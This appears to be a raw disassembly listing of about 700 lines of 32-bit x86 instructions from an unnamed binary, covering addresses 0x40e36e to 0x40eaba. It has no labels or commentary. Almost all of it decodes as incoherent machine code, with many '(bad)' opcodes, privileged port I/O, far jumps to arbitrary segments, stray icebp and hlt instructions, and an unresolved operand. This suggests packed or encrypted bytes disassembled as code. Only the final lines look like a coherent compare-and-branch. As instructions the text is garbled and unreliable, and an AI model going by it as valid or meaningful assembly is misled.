  40e36e:	add    eax,0x41571d82
  40e373:	and    eax,0xb6eb943b
  40e378:	int3   
  40e379:	mov    WORD PTR [ebp-0x35],cs
  40e37c:	mov    ecx,fs
  40e37e:	fcomp  QWORD PTR [esi]
  40e380:	test   ebx,ebp
  40e382:	popa   
  40e383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e384:	outs   dx,BYTE PTR ds:[esi]
  40e385:	lods   al,BYTE PTR ds:[esi]
  40e386:	popa   
  40e387:	aas    
  40e388:	arpl   WORD PTR [ecx+ecx*8],cx
  40e38b:	push   esp
  40e38c:	jmp    0xa3cb:0x5fe7f5c4
  40e393:	push   eax
  40e394:	scas   eax,DWORD PTR es:[edi]
  40e395:	and    ah,dh
  40e397:	or     al,0x9
  40e399:	or     dl,BYTE PTR [ebx+0x29]
  40e39c:	pusha  
  40e39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e39e:	repz mov dl,0xb2
  40e3a1:	shl    BYTE PTR [ebx-0x151b4638],1
  40e3a7:	fnsave [ecx-0x69832ea7]
  40e3ad:	mov    ebx,DWORD PTR [esp-0x57]
  40e3b1:	pushf  
  40e3b2:	dec    eax
  40e3b3:	push   es
  40e3b4:	and    eax,0x3affae26
  40e3b9:	cmp    ebx,DWORD PTR [esi-0x7b9738ba]
  40e3bf:	xor    BYTE PTR [eax+ecx*2+0x3a],dh
  40e3c3:	add    eax,0xc71f3927
  40e3c8:	pop    ecx
  40e3c9:	cs out dx,eax
  40e3cb:	rcl    BYTE PTR [ebp+0x55],0x7f
  40e3cf:	call   0x7ac162a9
  40e3d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3d5:	xor    eax,0xc0145d31
  40e3da:	in     eax,dx
  40e3db:	mul    DWORD PTR [ecx+0x39d76160]
  40e3e1:	inc    esi
  40e3e2:	sti    
  40e3e3:	cmp    eax,0xbb46c441
  40e3e8:	div    DWORD PTR [ebx]
  40e3ea:	aam    0x8f
  40e3ec:	mov    al,ds:0x1d2178f0
  40e3f1:	fstp   TBYTE PTR es:[edi]
  40e3f4:	pop    eax
  40e3f5:	arpl   WORD PTR [edx+0xf323496],di
  40e3fb:	jmp    0x40e46e
  40e3fd:	test   al,0xe8
  40e3ff:	pop    edi
  40e400:	icebp  
  40e401:	out    dx,al
  40e402:	and    BYTE PTR [ecx],ch
  40e404:	pop    edi
  40e405:	retf   
  40e406:	(bad)  
  40e407:	jg     0x40e3ea
  40e409:	clc    
  40e40a:	push   0x54dcc451
  40e40f:	(bad)  
  40e410:	iret   
  40e411:	add    eax,0x31966e16
  40e416:	mov    ebp,0xb2546049
  40e41b:	retf   0x418b
  40e41e:	inc    ecx
  40e41f:	sbb    dl,BYTE PTR [edi+0x3094484b]
  40e425:	mov    ds:0x1a2a103b,al
  40e42a:	in     al,dx
  40e42b:	push   ds
  40e42c:	pop    esi
  40e42d:	dec    ecx
  40e42e:	(bad)  
  40e42f:	cmp    al,0x33
  40e431:	test   DWORD PTR [ebx-0xfd84c31],eax
  40e437:	scas   eax,DWORD PTR es:[edi]
  40e438:	sub    dh,bl
  40e43a:	clc    
  40e43b:	pushf  
  40e43c:	mov    eax,ds:0xa8ee62c1
  40e441:	ins    DWORD PTR es:[edi],dx
  40e442:	push   edi
  40e443:	cs (bad) 
  40e445:	(bad)  
  40e446:	sub    esi,ebx
  40e448:	test   al,0x44
  40e44a:	mov    eax,0x5c9c5275
  40e44f:	dec    ebp
  40e450:	sbb    al,0x2
  40e452:	adc    al,0x15
  40e454:	rcr    dl,cl
  40e456:	xchg   esp,eax
  40e457:	cld    
  40e458:	mov    bl,0xc4
  40e45a:	cmp    al,BYTE PTR [eax+0x2]
  40e45d:	pop    esp
  40e45e:	push   ebx
  40e45f:	mov    bh,0x1f
  40e461:	in     al,0x14
  40e463:	and    DWORD PTR [ecx+esi*4],0xc
  40e467:	(bad)  
  40e468:	jns    0x40e451
  40e46a:	xchg   ebx,eax
  40e46b:	cld    
  40e46c:	xchg   DWORD PTR [ecx],esp
  40e46e:	or     bl,BYTE PTR [ecx-0x6]
  40e471:	sbb    ebp,DWORD PTR [edx+edi*8]
  40e474:	add    eax,0x9be0fbd2
  40e479:	dec    edi
  40e47a:	xor    eax,0xf8706020
  40e47f:	loope  0x40e4ab
  40e481:	sbb    DWORD PTR [eax-0x70],edx
  40e484:	ins    BYTE PTR es:[edi],dx
  40e485:	fisttp DWORD PTR [ecx+0x10]
  40e488:	ret    
  40e489:	adc    ebx,DWORD PTR [edx]
  40e48b:	cli    
  40e48c:	jb     0x40e496
  40e48e:	arpl   ax,cx
  40e490:	mov    ds:0x4f47224b,eax
  40e495:	xchg   ebp,eax
  40e496:	inc    edi
  40e497:	daa    
  40e498:	sahf   
  40e499:	add    BYTE PTR [edx],0x2a
  40e49c:	(bad)  
  40e49d:	scas   eax,DWORD PTR es:[edi]
  40e49e:	adc    edi,DWORD PTR [esp+ecx*1]
  40e4a1:	mov    eax,0x9bef302a
  40e4a6:	pop    esp
  40e4a7:	les    ebx,FWORD PTR [esi]
  40e4a9:	or     DWORD PTR [edx],ecx
  40e4ab:	mov    edi,0x24c2ee44
  40e4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b1:	xor    al,0x61
  40e4b3:	cmp    eax,0x2ffb32c4
  40e4b8:	inc    eax
  40e4b9:	sub    al,BYTE PTR [ebp+0x35ee4703]
  40e4bf:	lods   eax,DWORD PTR ds:[esi]
  40e4c0:	add    eax,DWORD PTR [ebx-0x1afd280d]
  40e4c6:	cmp    eax,0xb380f6e7
  40e4cb:	fisttp QWORD PTR [esi]
  40e4cd:	add    BYTE PTR [ebp+0x4e],0xc1
  40e4d1:	or     DWORD PTR [edx-0x614a8ef7],ebx
  40e4d7:	rcr    edx,cl
  40e4d9:	jno    0x40e54b
  40e4db:	dec    esp
  40e4dc:	mov    bl,ch
  40e4de:	out    dx,eax
  40e4df:	dec    edx
  40e4e0:	cmp    eax,0xd6a23a78
  40e4e5:	jle    0x40e532
  40e4e7:	mov    dl,0x37
  40e4e9:	jns    0x40e53b
  40e4eb:	fld    DWORD PTR [ebp-0x5]
  40e4ee:	pop    ecx
  40e4ef:	push   ebx
  40e4f0:	mov    al,0xae
  40e4f2:	sti    
  40e4f3:	fucomp st(1)
  40e4f5:	fcomp  DWORD PTR [ecx+0x1f]
  40e4f8:	imul   edi,DWORD PTR [ebp-0x55a2fed3],0xffffffc3
  40e4ff:	cmp    ebx,esp
  40e501:	mov    DWORD PTR [ebp+0x7bbb0a35],ecx
  40e507:	shl    ah,cl
  40e509:	into   
  40e50a:	ret    0x7e40
  40e50d:	or     ebx,edi
  40e50f:	sbb    eax,0x5b2e0598
  40e514:	out    dx,eax
  40e515:	movups XMMWORD PTR [eax-0x37debfe0],xmm2
  40e51c:	(bad)  
  40e51d:	stc    
  40e51e:	inc    ecx
  40e51f:	xchg   ebp,eax
  40e520:	div    BYTE PTR [ebx]
  40e522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e523:	lods   al,BYTE PTR ds:[esi]
  40e524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e525:	xchg   esp,eax
  40e526:	dec    ecx
  40e527:	lock icebp 
  40e529:	(bad)  
  40e52a:	add    al,0x31
  40e52c:	out    0xb9,eax
  40e52e:	rol    DWORD PTR [edi-0x5a],cl
  40e531:	out    0x3c,eax
  40e533:	add    eax,0xe9609e0c
  40e538:	cmp    BYTE PTR [ebp+0x4e],ch
  40e53b:	bound  edx,QWORD PTR [esi+0x12e1a870]
  40e541:	aam    0xc1
  40e543:	ror    BYTE PTR [edi+0x55],1
  40e546:	int3   
  40e547:	mov    al,ds:0xa2245669
  40e54c:	es ja  0x40e5b2
  40e54f:	adc    DWORD PTR [esi+edx*8+0x73],eax
  40e553:	cmp    eax,0x33befa2e
  40e558:	(bad)  
  40e559:	push   cs
  40e55a:	int3   
  40e55b:	inc    edi
  40e55c:	xor    eax,0x8a27edbb
  40e561:	shl    BYTE PTR [eax+0x254115ca],1
  40e567:	xchg   ebx,eax
  40e568:	cmp    dl,BYTE PTR [eax+eiz*8+0x1eb2bc5c]
  40e56f:	adc    bl,BYTE PTR [edx-0x4f]
  40e572:	push   eax
  40e573:	and    ah,BYTE PTR [eax]
  40e575:	dec    esi
  40e576:	mov    bl,0x4
  40e578:	push   esp
  40e579:	loope  0x40e5b1
  40e57b:	maxps  xmm1,XMMWORD PTR [ebx]
  40e57e:	or     ecx,0x343360d
  40e584:	mov    eax,0x84c12e1c
  40e589:	dec    edi
  40e58a:	cmp    eax,0xe6af3134
  40e58f:	fdiv   QWORD PTR [edx]
  40e591:	in     eax,0x6c
  40e593:	pop    esi
  40e594:	ins    DWORD PTR es:[edi],dx
  40e595:	adc    DWORD PTR [edx],0x6269dd42
  40e59b:	outs   dx,BYTE PTR ds:[esi]
  40e59c:	jae    0x40e5e9
  40e59e:	mov    ebp,0x7446f96c
  40e5a3:	in     al,dx
  40e5a4:	aaa    
  40e5a5:	out    dx,eax
  40e5a6:	and    dl,BYTE PTR [edi]
  40e5a8:	dec    ecx
  40e5a9:	pop    eax
  40e5aa:	cmp    al,0x1a
  40e5ac:	xor    edx,DWORD PTR [ecx]
  40e5ae:	cmp    BYTE PTR [ebp+0x7e84e701],ch
  40e5b4:	cs mov esp,0xc8f630dd
  40e5ba:	push   ecx
  40e5bb:	add    ah,bl
  40e5bd:	add    al,0xac
  40e5bf:	cmc    
  40e5c0:	push   edx
  40e5c1:	cld    
  40e5c2:	retf   
  40e5c3:	push   0xaa83dde0
  40e5c8:	push   ebx
  40e5c9:	in     al,dx
  40e5ca:	or     ebp,esi
  40e5cc:	xlat   BYTE PTR ds:[ebx]
  40e5cd:	adc    DWORD PTR [ecx+0x3f3e31ab],esi
  40e5d3:	ins    WORD PTR es:[edi],dx
  40e5d5:	xchg   DWORD PTR [edx-0x28],esi
  40e5d8:	jle    0x40e5d8
  40e5da:	adc    DWORD PTR ds:0xc5408b15,esp
  40e5e0:	dec    esp
  40e5e1:	aad    0x54
  40e5e3:	fwait
  40e5e4:	test   BYTE PTR [ebx-0x19],ch
  40e5e7:	mov    edx,0x27e8845c
  40e5ec:	sbb    eax,0x39067ad2
  40e5f1:	xchg   DWORD PTR [edi],ecx
  40e5f3:	std    
  40e5f4:	or     al,0x5e
  40e5f6:	sahf   
  40e5f7:	iret   
  40e5f8:	fadd   st(2),st
  40e5fa:	(bad)  
  40e5fb:	fwait
  40e5fc:	outs   dx,DWORD PTR ss:[esi]
  40e5fe:	mov    ebp,0xa308c926
  40e603:	mov    ds:0x57ceaead,al
  40e608:	hlt    
  40e609:	inc    ecx
  40e60a:	mov    dl,0xf9
  40e60c:	cmp    edx,DWORD PTR [esi]
  40e60e:	lds    ebx,FWORD PTR [edi+0x3d]
  40e611:	mov    dl,0xa0
  40e613:	jl     0x40e5e4
  40e615:	arpl   WORD PTR [edi+0x74b2e419],ax
  40e61b:	pop    ebp
  40e61c:	lods   eax,DWORD PTR ds:[esi]
  40e61d:	(bad)  
  40e61e:	cmp    al,0x39
  40e620:	cmovge esp,ecx
  40e623:	xlat   BYTE PTR ds:[ebx]
  40e624:	test   edi,edi
  40e626:	push   esp
  40e627:	(bad)  
  40e629:	jecxz  0x40e660
  40e62b:	or     DWORD PTR [eax+0x3026b442],ecx
  40e631:	ins    BYTE PTR es:[edi],dx
  40e632:	ins    DWORD PTR es:[edi],dx
  40e633:	inc    edi
  40e634:	lods   eax,DWORD PTR ds:[esi]
  40e635:	adc    eax,0xdcd70210
  40e63a:	mov    ah,0xbb
  40e63c:	mov    bh,0xb9
  40e63e:	xchg   edx,eax
  40e63f:	mov    ecx,0x1984f037
  40e644:	and    eax,0x2ed53bf0
  40e649:	adc    bl,ch
  40e64b:	fcmovnu st,st(1)
  40e64d:	icebp  
  40e64e:	mov    bl,0x8e
  40e650:	xor    dl,dl
  40e652:	pushf  
  40e653:	imul   DWORD PTR [ecx+0x3506e386]
  40e659:	mov    cl,0xca
  40e65b:	inc    eax
  40e65c:	loopne 0x40e65d
  40e65e:	mov    ds:0xe74a913e,al
  40e663:	push   ebx
  40e664:	out    0xb5,al
  40e666:	iret   
  40e667:	dec    BYTE PTR [edi-0x36]
  40e66a:	add    edi,DWORD PTR ds:0x5b759917
  40e670:	sbb    al,dh
  40e672:	out    dx,al
  40e673:	sub    bl,BYTE PTR [ebp+edi*4+0x41d440d0]
  40e67a:	mov    al,ds:0x917cbc96
  40e67f:	in     al,dx
  40e680:	fild   WORD PTR [esi]
  40e682:	out    0xf0,eax
  40e684:	xor    al,0x53
  40e686:	inc    edx
  40e687:	imul   esi,DWORD PTR [ebx+0x5f898bb4],0x69d8fecc
  40e691:	xchg   cx,ax
  40e693:	scas   eax,DWORD PTR es:[edi]
  40e694:	repnz imul ebx,DWORD PTR [esi-0x2e05b67f],0xfffffff8
  40e69c:	clc    
  40e69d:	pop    eax
  40e69e:	scas   al,BYTE PTR es:[edi]
  40e69f:	mov    eax,0xd370b2b9
  40e6a4:	push   edx
  40e6a5:	dec    ecx
  40e6a6:	ja     0x40e6f3
  40e6a8:	fs adc ah,al
  40e6ab:	inc    edx
  40e6ac:	retf   0xebf3
  40e6af:	or     eax,0xc0cd710e
  40e6b4:	(bad)  
  40e6b5:	stos   DWORD PTR es:[edi],eax
  40e6b6:	fwait
  40e6b7:	call   0xed06:0x99420034
  40e6be:	stos   DWORD PTR es:[edi],eax
  40e6bf:	pop    ebp
  40e6c0:	adc    eax,DWORD PTR [ecx-0x3275db4]
  40e6c6:	mov    ebx,0x949e374e
  40e6cb:	(bad)  
  40e6cc:	push   ecx
  40e6cd:	pushf  
  40e6ce:	and    DWORD PTR [ebx+edx*8+0x1db69a13],0xc1e90189
  40e6d9:	add    eax,DWORD PTR [eax]
  40e6db:	add    BYTE PTR [ebx],cl
  40e6dd:	push   0x67
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e754
  40e6e9:	shr    al,cl
  40e6eb:	mov    gs,WORD PTR [ecx+eiz*4+0x7c]
  40e6ef:	jl     0x40e698
  40e6f1:	jns    0x40e76f
  40e6f3:	jl     0x40e725
  40e6f5:	stc    
  40e6f6:	es test eax,0x2011b02c
  40e6fc:	xchg   ecx,eax
  40e6fd:	pop    ebx
  40e6fe:	push   eax
  40e6ff:	mov    dl,0xeb
  40e701:	inc    ecx
  40e702:	shl    DWORD PTR [edx],0x39
  40e705:	add    eax,0x18f48bf6
  40e70a:	jo     0x40e739
  40e70c:	enter  0xb5ba,0x4
  40e710:	stos   BYTE PTR es:[edi],al
  40e711:	add    eax,0x7c376633
  40e716:	jp     0x40e744
  40e718:	aad    0x4b
  40e71a:	cmp    BYTE PTR [eax-0x36],cl
  40e71d:	ja     0x40e721
  40e71f:	cdq    
  40e720:	push   esi
  40e721:	call   FWORD PTR [edi]
  40e723:	dec    edi
  40e724:	xor    BYTE PTR [esi+0x5],0x5b
  40e728:	push   ebp
  40e72a:	js     0x40e785
  40e72c:	hlt    
  40e72d:	stc    
  40e72e:	and    al,0xf4
  40e730:	or     esi,0xffffff91
  40e733:	call   0x941d7b23
  40e738:	pop    ss
  40e739:	rol    BYTE PTR [edi+0xe0037ec],1
  40e73f:	xor    eax,0xdd9c9ba0
  40e744:	cmp    bh,BYTE PTR [eax+ebp*2-0x19]
  40e748:	ret    
  40e749:	jl     0x40e720
  40e74b:	mov    dl,0x66
  40e74d:	mov    ebp,DWORD PTR [ecx]
  40e74f:	call   0x8827625
  40e754:	inc    eax
  40e755:	xchg   esp,eax
  40e756:	inc    esp
  40e757:	mov    ah,0x6e
  40e759:	jb     0x40e71b
  40e75b:	add    esp,DWORD PTR ds:0x8ee050be
  40e761:	repz add eax,0xe8ab5582
  40e767:	(bad)  
  40e769:	fs push ss
  40e76b:	sub    DWORD PTR [edx],edi
  40e76d:	xchg   ebp,eax
  40e76e:	inc    ecx
  40e76f:	fisttp WORD PTR [ecx+0x46]
  40e772:	les    ecx,FWORD PTR [edi+0x1]
  40e775:	shl    ebp,cl
  40e777:	fild   WORD PTR [ebp-0x69]
  40e77a:	mov    ?,WORD PTR [esi]
  40e77c:	sub    dh,BYTE PTR [eax]
  40e77e:	lea    esi,[ebx+0x57]
  40e781:	jo     0x40e7b5
  40e783:	loopne 0x40e75c
  40e785:	popa   
  40e786:	sub    BYTE PTR [ebx+0x15723834],bh
  40e78c:	mov    esp,0x1594c9bd
  40e791:	jne    0x40e73a
  40e793:	or     al,0x45
  40e795:	jne    0x40e725
  40e797:	popa   
  40e798:	repz sub ebx,0xec3867ff
  40e79f:	pop    ebx
  40e7a0:	xchg   esp,esi
  40e7a2:	jg     0x40e79b
  40e7a4:	and    al,al
  40e7a6:	imul   eax,DWORD PTR [ecx],0x1
  40e7a9:	loope  0x40e80f
  40e7ab:	jmp    0xe848c8f5
  40e7b0:	xor    eax,DWORD PTR [esi]
  40e7b2:	(bad)  
  40e7b3:	mov    WORD PTR [ebx-0x2d17b33b],gs
  40e7b9:	popa   
  40e7ba:	psubsb mm1,QWORD PTR [esi]
  40e7bd:	jp     0x40e74d
  40e7bf:	xchg   edi,eax
  40e7c0:	jle    0x40e7ab
  40e7c2:	mov    eax,ds:0x75f5310
  40e7c7:	dec    DWORD PTR [esi]
  40e7c9:	xchg   ecx,eax
  40e7ca:	push   es
  40e7cb:	mov    edx,0x2eada175
  40e7d0:	xor    ch,BYTE PTR [eax-0xa33a80f]
  40e7d6:	neg    DWORD PTR [ecx]
  40e7d8:	test   DWORD PTR [esi+0x72],esi
  40e7db:	leave  
  40e7dc:	inc    ecx
  40e7dd:	aas    
  40e7de:	mov    eax,ds:0xc576a2a
  40e7e3:	pusha  
  40e7e4:	mov    ds,WORD PTR [edi+0x98f9095]
  40e7ea:	stc    
  40e7eb:	mov    eax,0xc093e356
  40e7f0:	push   es
  40e7f1:	or     DWORD PTR [esi+0x3a77bbcb],esi
  40e7f7:	pop    ds
  40e7f8:	arpl   WORD PTR [eax],di
  40e7fa:	jne    0x40e81a
  40e7fc:	and    eax,0x9b0cf396
  40e801:	mov    esp,0x76359153
  40e806:	iret   
  40e807:	imul   ebx,DWORD PTR [edx-0x53],0x6f69bc2
  40e80e:	inc    edx
  40e80f:	hlt    
  40e810:	mov    dh,0xca
  40e812:	dec    ebx
  40e813:	scas   eax,DWORD PTR es:[edi]
  40e814:	dec    edx
  40e815:	push   0x3e
  40e817:	push   edx
  40e818:	sub    BYTE PTR [ecx],dl
  40e81a:	ins    DWORD PTR es:[edi],dx
  40e81b:	mov    eax,0xde4a6b3a
  40e820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e821:	enter  0xc771,0x67
  40e825:	dec    edi
  40e826:	add    al,0xb3
  40e828:	jns    0x40e80f
  40e82a:	mov    BYTE PTR [edx-0x5e],0x39
  40e82e:	push   esp
  40e82f:	stos   BYTE PTR es:[edi],al
  40e830:	fs loopne 0x40e84d
  40e833:	test   BYTE PTR [ecx],bl
  40e835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e836:	ror    al,1
  40e838:	and    ebx,eax
  40e83a:	dec    esi
  40e83b:	sbb    bl,BYTE PTR [ebx+0x4f7ec17d]
  40e841:	xchg   edi,eax
  40e842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e843:	pop    edi
  40e844:	adc    DWORD PTR [ecx-0x54],ebp
  40e847:	loop   0x40e814
  40e849:	fnstcw WORD PTR [ebx]
  40e84b:	xchg   ebx,eax
  40e84c:	arpl   bx,ax
  40e84e:	mov    dl,0x2a
  40e850:	in     eax,0xf2
  40e852:	jecxz  0x40e8b5
  40e854:	or     dl,BYTE PTR ds:0xb109dd21
  40e85a:	add    eax,0xace9ca1c
  40e85f:	xchg   edx,eax
  40e860:	addr16 pushf 
  40e862:	loop   0x40e851
  40e864:	(bad)  
  40e865:	lock and al,0x1d
  40e868:	or     DWORD PTR [edx-0x39],0xffffffe1
  40e86c:	cwde   
  40e86d:	das    
  40e86e:	scas   al,BYTE PTR es:[edi]
  40e86f:	fs (bad) 
  40e871:	mov    esi,0x7cedaab4
  40e876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e877:	xor    DWORD PTR [eax],edi
  40e879:	xchg   esi,eax
  40e87a:	add    BYTE PTR [eax-0x2580064c],bh
  40e880:	scas   eax,DWORD PTR es:[edi]
  40e881:	mov    dh,al
  40e883:	outs   dx,BYTE PTR ds:[esi]
  40e884:	adc    ebp,eax
  40e886:	inc    DWORD PTR [eax-0x9277c6]
  40e88c:	adc    al,BYTE PTR [ebx+0x48]
  40e88f:	mov    bh,0x7f
  40e891:	or     BYTE PTR [ebx],0x2f
  40e894:	sbb    al,0x77
  40e896:	aam    0x4e
  40e898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e899:	dec    edi
  40e89a:	int    0xc5
  40e89c:	test   al,0x28
  40e89e:	(bad)  
  40e8a0:	or     al,0xc6
  40e8a2:	call   FWORD PTR [edi-0x78]
  40e8a5:	lods   al,BYTE PTR ds:[esi]
  40e8a6:	and    al,0x1a
  40e8a8:	jl     0x40e8b0
  40e8aa:	mov    esp,0x3c783b8a
  40e8af:	mov    ds:0xd03469f6,eax
  40e8b4:	sbb    BYTE PTR [ebx+0x654b9d59],dh
  40e8ba:	call   0xc13580aa
  40e8bf:	dec    ebp
  40e8c0:	rcl    DWORD PTR [ebp-0x70],1
  40e8c3:	je     0x40e937
  40e8c5:	mov    cx,0x295d
  40e8c9:	clc    
  40e8ca:	rol    DWORD PTR ss:[esi],1
  40e8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8ce:	aad    0x7e
  40e8d0:	add    cl,0xdf
  40e8d3:	test   BYTE PTR [esi-0x70],dl
  40e8d6:	fsubp  st(4),st
  40e8d8:	fimul  WORD PTR [eax+eiz*4+0x59]
  40e8dc:	cmp    eax,0x2f3c3a9b
  40e8e1:	stc    
  40e8e2:	xchg   esi,eax
  40e8e3:	test   DWORD PTR ds:0xbe63a9a0,eax
  40e8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8ea:	and    eax,DWORD PTR [ebx+0x7695d831]
  40e8f0:	cmc    
  40e8f1:	aas    
  40e8f2:	inc    edi
  40e8f3:	test   BYTE PTR [eax+0xf9f8aaa],ah
  40e8f9:	xchg   edi,eax
  40e8fa:	push   ecx
  40e8fb:	stc    
  40e8fc:	dec    DWORD PTR [edx+eax*1]
  40e8ff:	scas   eax,DWORD PTR es:[edi]
  40e900:	std    
  40e901:	sbb    DWORD PTR [edx+0x35],edi
  40e904:	call   0x634a2bc1
  40e909:	lea    ebx,[edx+edi*1]
  40e90c:	enter  0x242e,0x78
  40e910:	xchg   esp,eax
  40e911:	cmc    
  40e912:	loop   0x40e902
  40e914:	inc    esp
  40e915:	outs   dx,BYTE PTR ds:[esi]
  40e916:	push   ds
  40e917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e918:	jb     0x40e920
  40e91a:	adc    DWORD PTR [ebx+0x58126cb9],ebx
  40e920:	jg     0x40e8ab
  40e922:	sti    
  40e923:	xor    bh,0xd4
  40e926:	xor    BYTE PTR [eax-0x574ffe46],al
  40e92c:	stos   BYTE PTR es:[edi],al
  40e92d:	fs dec esi
  40e92f:	mov    ch,cl
  40e931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e932:	xor    eax,0xe19bdae0
  40e937:	test   dl,0x96
  40e93a:	inc    ebx
  40e93b:	mov    al,ds:0x59d32fc
  40e940:	sbb    ah,0x77
  40e943:	mov    bh,0x6e
  40e945:	popf   
  40e946:	mov    al,0xbf
  40e948:	mov    ah,0xbd
  40e94a:	dec    esi
  40e94b:	inc    edi
  40e94c:	jl     0x40e95d
  40e94e:	fld    DWORD PTR [edi]
  40e950:	jp     0x40e901
  40e952:	dec    esi
  40e953:	dec    ebx
  40e954:	arpl   ax,ax
  40e956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e957:	push   esi
  40e958:	pop    ss
  40e959:	mov    cl,bh
  40e95b:	or     al,0x7e
  40e95d:	cld    
  40e95e:	mov    DWORD PTR [edx+edi*4+0x79],esp
  40e962:	nop
  40e963:	inc    esp
  40e964:	inc    ecx
  40e965:	bound  edx,QWORD PTR [edx+0x4e]
  40e968:	mov    al,0x66
  40e96a:	adc    ebx,DWORD PTR [ebp-0x15]
  40e96d:	push   es
  40e96e:	dec    ebx
  40e96f:	mov    edx,0x65b350d3
  40e975:	pushf  
  40e976:	aas    
  40e977:	dec    edx
  40e978:	sbb    cl,al
  40e97a:	je     0x40e9fb
  40e97c:	in     eax,dx
  40e97d:	cld    
  40e97e:	pop    ebx
  40e97f:	(bad)  
  40e980:	mov    ds:0xc1571606,eax
  40e985:	inc    edx
  40e986:	dec    edi
  40e987:	adc    ebx,DWORD PTR [edx+ebx*4-0x4237d132]
  40e98e:	in     eax,dx
  40e98f:	test   BYTE PTR [edx+0x212eee4b],ch
  40e995:	pop    edi
  40e996:	loopne 0x40e97f
  40e998:	jmp    0x208d4b01
  40e99d:	or     al,BYTE PTR [ebp-0x20a7f750]
  40e9a3:	retf   0x40a6
  40e9a6:	pushf  
  40e9a7:	cld    
  40e9a8:	xchg   ah,al
  40e9aa:	xchg   BYTE PTR [esi],ah
  40e9ac:	sbb    BYTE PTR [ecx-0x43],dh
  40e9af:	fcomp  QWORD PTR [ebp+0x6a25153d]
  40e9b5:	jecxz  0x40e97b
  40e9b7:	or     dh,bh
  40e9b9:	sub    ecx,DWORD PTR [edi]
  40e9bb:	scas   eax,DWORD PTR es:[edi]
  40e9bc:	nop
  40e9bd:	mov    ecx,0xcc07a8b
  40e9c2:	add    al,0x34
  40e9c4:	aas    
  40e9c5:	jmp    0xf9cb:0x59256169
  40e9cc:	push   edi
  40e9cd:	icebp  
  40e9ce:	pop    esp
  40e9cf:	sbb    al,0x3f
  40e9d1:	pop    esi
  40e9d2:	jae    0x40e9a9
  40e9d4:	sub    eax,0xfe459feb
  40e9d9:	jmp    0xf915192d
  40e9de:	push   esi
  40e9df:	and    edx,DWORD PTR [edi+0x96b9d5e]
  40e9e5:	pop    ecx
  40e9e6:	cmp    bh,bh
  40e9e8:	popa   
  40e9e9:	pop    ebp
  40e9ea:	mov    edx,0x2c840def
  40e9ef:	xor    ebx,edx
  40e9f1:	and    eax,0x692a1041
  40e9f6:	pop    eax
  40e9f7:	pop    ebp
  40e9f8:	cmp    edx,DWORD PTR [ebx-0x39e3cfc3]
  40e9fe:	dec    ebx
  40e9ff:	in     al,dx
  40ea00:	lds    esp,FWORD PTR [eax-0x1c]
  40ea03:	jns    0x40ea5f
  40ea05:	mov    dl,0x1
  40ea07:	xor    dl,BYTE PTR [ebp+ebx*4-0x6508ed43]
  40ea0e:	sub    eax,0xbe57bf48
  40ea13:	pop    es
  40ea14:	fadd   DWORD PTR [ebx-0x54]
  40ea17:	or     ah,BYTE PTR es:[ebx+0x60fa9f31]
  40ea1e:	call   DWORD PTR [esp+edi*2+0x37]
  40ea22:	jo     0x40ea5e
  40ea24:	mov    dh,0x62
  40ea26:	sub    BYTE PTR [edx],bh
  40ea28:	push   ss
  40ea29:	mov    ch,0xf6
  40ea2b:	sub    al,0xca
  40ea2d:	xchg   edi,eax
  40ea2e:	fidiv  DWORD PTR [edi+ebp*2]
  40ea31:	xchg   edi,eax
  40ea32:	popa   
  40ea33:	pop    ecx
  40ea34:	out    0x7,al
  40ea36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea37:	mov    esp,0x24ce78e8
  40ea3c:	cmp    ebp,edi
  40ea3e:	push   cs
  40ea3f:	and    DWORD PTR [ecx+0x13a36c9f],ebx
  40ea45:	cdq    
  40ea46:	add    ecx,esi
  40ea48:	imul   eax,esi,0xffffffcd
  40ea4b:	ins    DWORD PTR es:[edi],dx
  40ea4c:	mov    eax,ds:0x8eff08d
  40ea51:	xor    ah,BYTE PTR ds:0x6baacef9
  40ea57:	mov    DWORD PTR [eax],ecx
  40ea59:	sbb    DWORD PTR ds:0xf3c6d91d,ebp
  40ea5f:	in     al,dx
  40ea60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea61:	xchg   ecx,eax
  40ea62:	mov    al,ds:0xc8f0c680
  40ea67:	pop    ebx
  40ea68:	loopne 0x40ea91
  40ea6a:	les    edx,FWORD PTR [eax]
  40ea6c:	dec    eax
  40ea6d:	push   cs
  40ea6e:	jo     0x40ea65
  40ea70:	xor    DWORD PTR [ebx+0x77d324dc],eax
  40ea76:	xchg   esi,eax
  40ea77:	out    0xc8,al
  40ea79:	retf   0x5e42
  40ea7c:	ins    DWORD PTR es:[edi],dx
  40ea7d:	sbb    DWORD PTR [esi-0x68],esi
  40ea80:	sbb    dh,BYTE PTR [ecx-0x6]
  40ea83:	or     eax,0x4e
  40ea86:	cmp    DWORD PTR [esp+ecx*2+0x1cc64bc7],edi
  40ea8d:	stos   BYTE PTR es:[edi],al
  40ea8e:	and    cl,BYTE PTR [eax-0x79c9f09]
  40ea94:	push   0xb61545c2
  40ea99:	sub    bh,BYTE PTR ds:0x458b2c17
  40ea9f:	clc    
  40eaa0:	jmp    0x40f269
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
